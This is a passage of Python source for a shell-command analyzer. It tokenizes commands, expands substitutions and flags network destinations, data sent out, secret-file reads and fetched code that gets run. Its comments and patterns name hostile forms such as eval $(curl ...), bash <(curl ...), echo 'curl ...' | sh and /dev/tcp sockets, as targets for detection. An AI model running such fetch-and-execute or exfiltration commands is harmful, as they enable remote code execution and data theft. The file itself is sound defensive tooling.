    plain = text.translate(_NO_QUOTES)
    found: list[tuple[str, bool]] = []
    for source, rxs in ((plain, (_ALWAYS_WORD, _PUSH, _UPLOAD, _DEV_TCP)), (text, (_NET_CALL,))):
        bounds: tuple[list[int], list[int]] | None = None
        last: dict[tuple[int, bool], int] = {}
        for rx in rxs:
            for m in rx.finditer(source):
                bounds = bounds or _statements(source)
                starts, ends = bounds
                k = max(0, bisect_right(starts, m.start()) - 1)
                key = (k, rx is _NET_CALL)
                if m.start() - last.get(key, -_WINDOW) < _WINDOW // 2:
                    continue  # the window of a sender just before covers this one's, so the windows stay linear
                last[key] = m.start()
                window = source[max(starts[k], m.start() - _WINDOW):min(ends[k], m.start() + _WINDOW)]
                if rx is _NET_CALL and not (_SEND_CALL.search(window) or _SOCKET_CALL.search(window)
                                            or _FILE_READ_CALL.search(window)):
                    continue
                begins = rx is not _NET_CALL and m.start() - starts[k] <= 300 \
                    and _LEAD.fullmatch(source, starts[k], m.start()) is not None
                found.append((window.translate(_NO_QUOTES), begins))
                if len(found) >= _MAX_WINDOWS:
                    return found
    return found


def _paired(windows: list[str]) -> bool:
    """Whether one of the windows holds an address that is not this machine; if reading them all costs more than
    ``_MAX_SCANNED`` characters, they are taken to (a command too long to read is not assumed harmless)."""
    left = _MAX_SCANNED
    for w in dict.fromkeys(windows):
        if _addresses([w]):
            return True
        left -= 2 * len(w)
        if left < 0:
            return True
    return False


def _addresses(texts: list[str], known: str = "") -> set[str]:
    """Every address in ``texts`` that is not this machine, as written and with the characters that end one as
    blanks. The first text is read whole (but for a form that is ``known`` to have been read already); of the
    others (the same text read in other ways) at most ``_MAX_SCANNED`` characters in all, in order: reading an
    address costs a few microseconds a character."""
    chosen = [w for w in _unquoted(texts[0]) if w != known] if texts else []
    left = _MAX_SCANNED
    for t in texts[1:]:
        for w in _unquoted(t, ends=False):
            if left > 0 and w != known:
                chosen.append(w[:left])
            left -= len(w)
    return {v for v in network_values("\n".join(chosen)) if not is_loopback(v)}


def _backstops(command: str, found: Command) -> None:
    """A command that is not plain syntax is not read-only whatever the parser made of it. Every address in its
    raw text (read the ways above) is one it may reach, and a command that is not read-only and holds a sender in
    the same statement as an address is taken to send to it. When every sender is a static statement (``git push
    origin main``: no variable, no substitution, no file read for its address) an address in another statement
    (a link in a commit message or a README) is not one it reaches: the statement cannot take its address from
    there."""
    if not _plain(command):
        found.read_only = False
    variants = _variants(command)
    read = [w for t in variants for w in _sender_windows(t)]
    windows = [w for w, _ in read]
    static = bool(read) and all(begins and not _DYNAMIC.search(w) for w, begins in read)
    # (a command over the cap was read whole as written by the fallback: not again)
    found.destinations |= _addresses(windows if static else variants, command if len(command) > _MAX_COMMAND else "")
    if not found.read_only:
        found.sends |= _paired(windows)


def parse(command: str, depth: int = 0, env: dict[str, str] | None = None,
          loops: frozenset[str] = frozenset()) -> Command:
    """What ``command`` does. ``env`` holds the variables, and ``loops`` the loop variables, of the command that
    contains this one (a ``-c`` string, a ``$(...)``, a here-document)."""
    found = _read(command, depth, env, loops)
    if depth == 0:
        _backstops(command, found)
    return found


def _read(command: str, depth: int, env: dict[str, str] | None, loops: frozenset[str]) -> Command:
    found = Command()
    if depth == 0:
        _state.budget = _MAX_EXPANSION
        _state.carry = _MAX_CARRIED_TOTAL
    if len(command) > _MAX_COMMAND or sum(command.count(c) for c in _OPERATOR_CHARS) > _MAX_OPERATORS:
        return _unreadable(command, found)  # not worth tokenizing; read the raw text
    text, bodies = _prepare(command)
    text, values, ambiguous = _expand(text, env or {})
    clean = text.translate(_AS_WRITTEN)  # what the shell would read, for the scans that look at plain text
    loopvars = loops | frozenset(re.findall(r"\bfor\s+(\w+)\s+in\b", text))
    parts = _substitutions(text)
    if len(bodies) > _MAX_PARTS or parts is None:  # too many to read one by one
        return _unreadable(command, found, clean)
    if any(kind == "opaque" for kind, _ in bodies):  # bash 5.3 ${ cmd; }, or a ${ that is never closed
        return _unreadable(command, found, clean)
    for kind, body in bodies:
        if depth >= 3:
            continue
        if kind == "shell":
            _merge(found, parse(body, depth + 1, values, loopvars))
        elif kind == "code":
            _code(body, found, depth)
        elif kind == "text":  # an unquoted delimiter: the shell runs the substitutions in the body
            for inner in _inner(body) or []:
                _merge(found, parse(inner, depth + 1, None, loopvars))
    if ambiguous:  # a variable's value at its use is not known: read the raw text
        return _unreadable(command, found, clean)
    _defaults(clean, found)
    hidden = False  # code made from the output of a command (eval "$(...)", bash <(...)): not known until it runs
    for start, inner in parts:  # $(...) and `...` run first, and their output goes anywhere
        if depth < 3:
            ran = parse(inner.translate(_AS_WRITTEN), depth + 1, None, loopvars)
            _merge(found, ran)
            if _RUNS_ARGUMENT.search(text[max(0, start - 40):start]):
                hidden = True
                if ran.destinations and ran.fetches:
                    found.runs_fetched = True  # eval $(curl ...), source $(curl ...)
    _masked_hosts(clean, found)
    tokens = _tokens(text)
    if tokens is None:  # unbalanced quotes
        return _unreadable(command, found, clean)
    for match in _DEV_TCP.finditer(clean):  # a bash network socket
        found.destinations |= network_values(match[1])
        found.remote |= any(not is_loopback(v) for v in found.destinations)
        found.sends = True
    pieces = [piece for token in tokens
              for piece in (_SPLIT_OPERATORS.findall(token) if len(token) > 1 and set(token) <= _PUNCTUATION
                            else [token])]
    argv: list[str] = []
    piped_in = False
    carried: str | None = None  # text the stage before passes on: echo 'curl ..' | sh, cat <<< 'curl ..' | sh
    net_stream = False  # what comes in on stdin is a network tool's output
    here: list[str] = []
    groups: list[tuple[list[str], bool, int] | None] = []  # open "(" groups; a <(...) keeps the command it is in
    i = 0
    while i <= len(pieces):
        token = pieces[i] if i < len(pieces) else ";"
        if token in _REDIRECTS:
            target = pieces[i + 1] if i + 1 < len(pieces) else ""
            nested = target in ("<(", ">(")  # > >(cmd): the target is a process substitution, read as one
            if token.startswith((">", "&>")) and token not in (">&",) and target not in ("/dev/null", "/dev/stderr",
                                                                                      "/dev/stdout"):
                found.read_only = False
            target = target.translate(_PLAIN)
            if token.startswith("<") and SECRET.search(target):
                found.secrets.append(target)
            if token == "<<<":
                here.append(target)
            # the digit of "2>" or "0<<<" was taken as an argument; drop it
            if argv and argv[-1].isdigit() and token.startswith((">", "<")):
                argv.pop()
            i += 1 if nested else 2
            continue
        if token in ("<(", ">("):  # process substitution: the commands inside run, their output is a file
            groups.append((argv, piped_in, found.fetches))
            argv, piped_in, carried, net_stream = [], False, None, False
            i += 1
            continue
        if token in _OPERATORS or (token and set(token) <= _PUNCTUATION):
            if argv and piped_in and carried is not None and any(PurePosixPath(w).name == "xargs" for w in argv):
                argv = _xargs(argv, carried)
            name, runs_stdin = _segment(argv, piped_in, found, depth, values, loopvars) if argv else ("", False)
            if piped_in and net_stream and runs_stdin:
                found.runs_fetched = True
            if depth < 3 and runs_stdin:
                if piped_in and carried is not None:  # echo 'curl ...' | sh
                    if name in _SHELLS:
                        _merge(found, parse(carried, depth + 1, values, loopvars))
                    else:
                        _code(carried, found, depth)
                for text_in in here:  # sh <<< 'curl ...'
                    if name in _SHELLS:
                        _merge(found, parse(text_in, depth + 1, values, loopvars))
                    else:
                        _code(text_in, found, depth)
            piped = token in ("|", "|&")
            given = _program(argv)[1:] if argv else []
            if not piped:
                carried, net_stream = None, False
            elif name in ("echo", "printf"):
                carried, net_stream = " ".join(given), False
            elif name == "cat" and here:
                carried, net_stream = " ".join(here), False
            elif not (name in _PASS_THROUGH and piped_in):  # tee, tr, sed ...: the same text, the same origin
                carried, net_stream = None, name in _NETWORK
            here = []
            if carried is not None:  # xargs echo a | xargs echo a | ...: the text grows at every stage
                _state.carry = getattr(_state, "carry", _MAX_CARRIED_TOTAL) - len(carried)
                if len(carried) > _MAX_CARRIED or _state.carry < 0:
                    carried, hidden = None, True
                    found.read_only = False
            if token == ")" and groups and groups[-1] is not None:
                outer, outer_piped, fetches = groups.pop()  # <(...) ends: its place in the command is a file
                program = _program(outer)
                runner = bool(program) and (program[0] in (".", "source")
                                            or _binary(program[0]) in _RUNNERS - _NETWORK)
                hidden |= runner
                if runner and found.fetches > fetches:
                    found.runs_fetched = True  # bash <(curl ...)
                argv, piped_in, carried, net_stream = outer + ["PROCSUB"], outer_piped, None, False
                i += 1
                continue
            if token == "(":
                groups.append(None)
            elif token == ")" and groups:
                groups.pop()
            piped_in = piped
            argv = []
        else:
            argv.append(token.translate(_PLAIN))
        i += 1
    if argv:  # a redirection with no target ended the command
        _segment(argv, piped_in, found, depth, values, loopvars)
    # Data in an address: a query or path built from a command's output or from a variable the command does not
    # set itself (a loop variable is not data; "$TOKEN" may be).
    for url in _URL.findall(clean):
        if "$(" in url or url.count("`") > 1 or set(re.findall(r"\$\{?(\w+)", url)) - loopvars:
            found.sends = True
    if hidden:
        _opaque(command, found)
    found.secrets = list(dict.fromkeys(found.secrets))
    return found
